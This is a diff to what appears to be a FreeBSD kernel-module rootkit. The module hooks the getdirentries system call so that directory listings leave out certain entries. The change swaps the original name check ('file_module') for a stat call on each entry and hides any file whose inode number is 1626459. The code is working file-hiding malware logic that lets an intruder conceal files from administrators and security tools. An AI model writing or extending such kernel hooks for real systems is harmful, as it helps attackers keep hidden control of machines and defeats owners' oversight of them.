@@ -16,6 +16,11 @@
 #include <sys/dirent.h>
 #include <sys/malloc.h>
 
+#include <sys/uio.h>
+#include <sys/syscallsubr.h>
+#include <sys/stat.h>
+#include <sys/unistd.h>
+
 
 static int getdirentries_hook(struct thread *td, void *syscall_args)
 {
@@ -32,6 +37,8 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 	sys_getdirentries(td, syscall_args);
 	size = td->td_retval[0];
 
+	
+
 	if (size > 0)
 	{
 		dp = malloc(size, M_TEMP, M_NOWAIT);
@@ -44,7 +51,14 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 		{
 			count -= current->d_reclen;
 
-			if (strcmp((char *)&(current->d_name), "file_module" ) == 0)
+			struct stat sb;
+			kern_statat(td, 0, uap->fd, current->d_name, UIO_SYSSPACE, &sb, NULL);
+
+			// Debug information
+			//printf("Inodes: %lu\n", sb.st_ino);
+
+
+			if (sb.st_ino == 1626459)
 			{
 				if (count != 0)
 				{
